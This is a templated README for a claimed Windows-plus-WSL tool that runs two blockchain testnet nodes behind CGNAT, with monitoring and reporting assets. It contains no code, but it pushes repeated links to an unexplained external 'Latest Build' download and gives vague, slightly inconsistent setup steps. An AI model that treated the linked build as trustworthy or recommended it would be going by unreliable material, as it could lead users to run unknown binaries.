# DAC Dual Node CGNAT Setup v2026 - blockchain infrastructure 2026

> **Dual-node DAC testnet infrastructure for Windows + WSL, built for CGNAT-constrained environments, with static peering, monitoring, and reporting in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20%2B%20WSL-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hughessven73/dac-dual-node-cgnat-setup-win-21054?style=flat-square)](https://github.com/hughessven73/dac-dual-node-cgnat-setup-win-21054)

---

<p align="center">
  <a href="https://hughessven73.github.io/dac-dual-node-cgnat-setup-win-21054/">
    <img src="https://img.shields.io/badge/Download-DAC%20Dual%20Node%20CGNAT%20Setup%20Latest-brightgreen?style=for-the-badge" alt="Download DAC Dual Node CGNAT Setup">
  </a>
</p>

> **[Direct Download - DAC Dual Node CGNAT Setup v2026](https://hughessven73.github.io/dac-dual-node-cgnat-setup-win-21054/)**

---

[Download Latest Build](https://hughessven73.github.io/dac-dual-node-cgnat-setup-win-21054/)

---

## About DAC Dual Node CGNAT Setup

DAC Dual Node CGNAT Setup packages a community-oriented testnet infrastructure workflow for running two nodes on one machine, with a layout designed around Windows and WSL. It focuses on the practical constraints of CGNAT networking, where direct exposure is limited and static peer relationships become part of the setup process.

The repository is also aimed at people who need visibility into node behavior while they work. Alongside the deployment-oriented material, it includes monitoring and observation assets such as Grafana and Prometheus references, node dashboard components, enode watching, sender tooling, and a technical report archive that helps document progress and field notes.

---

## Features

- Dual-node deployment model on a single machine
- Windows and WSL support for mixed-environment operation
- Configuration patterns for CGNAT-restricted networking
- Static peer setup for controlled node connectivity
- Internal LAN routing guidance for local node traffic
- Node monitoring assets, including dashboard-oriented materials
- Observation tooling such as enode watcher and sender utilities
- Technical reporting archive for tracking DAC testnet work

---

## Installation

Clone the repository or download the latest build, then place the project in a working directory on your Windows host.

1. Clone the repository:
   `git clone https://github.com/hughessven73/dac-dual-node-cgnat-setup-win-21054.git
2. Open the project folder:
   `cd dac-dual-node-cgnat-setup`
3. Review the included notes for the Windows + WSL layout, peer settings, and monitoring assets.
4. Start the relevant node, dashboard, or reporting components according to your local workflow.

If you are using the published build, download it first and extract it before launching the included files from your chosen environment.

---

## Usage

A typical workflow is to bring up the two-node layout, confirm the local routing path, and then apply the static peer references needed for CGNAT-based operation.

Example flow:
1. Start the Windows-side and WSL-side node components.
2. Verify internal connectivity across the local network path.
3. Apply static peering details before observing network participation.
4. Use the monitoring assets to review node status and progress.
5. Check the technical report archive for setup notes and field observations.

For monitoring-oriented work, open the dashboard resources and pair them with Prometheus and Grafana components where applicable in your environment.

---

## Configuration

Configuration is typically handled through the included setup files and environment-specific node settings. Depending on your workflow, you may need to review:

- peer and address entries for static connectivity
- routing details for the internal LAN path
- node-specific parameters for Windows and WSL
- monitoring endpoints for Grafana and Prometheus
- observation settings for enode watcher or sender tooling

If you are adapting the setup, keep the Windows host, WSL instance, and local network assumptions aligned before starting the nodes.

---

## Requirements

- Windows host system
- WSL environment enabled
- Access to a local network or LAN routing path
- A setup suitable for CGNAT-constrained connectivity
- Storage for node data, monitoring assets, and report files
- Basic tooling for launching and observing the DAC testnet components

---

## FAQ

**Can this be used outside CGNAT environments?**  
The project is centered on CGNAT-aware networking, but the same setup concepts may still inform other local test arrangements.

**Where do I look for monitoring details?**  
Check the dashboard assets and the Grafana or Prometheus references included with the repository materials.

**How do I update the setup?**  
Replace the local files with the latest published build, then review any changed peer, routing, or monitoring notes before restarting the nodes.

**What should I do if nodes do not connect?**  
Recheck static peer settings, local routing, and the Windows + WSL environment boundaries before retrying.

**Is there documentation for progress and observations?**  
Yes. The repository includes a technical reporting archive intended for setup notes, field reports, and progress tracking.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
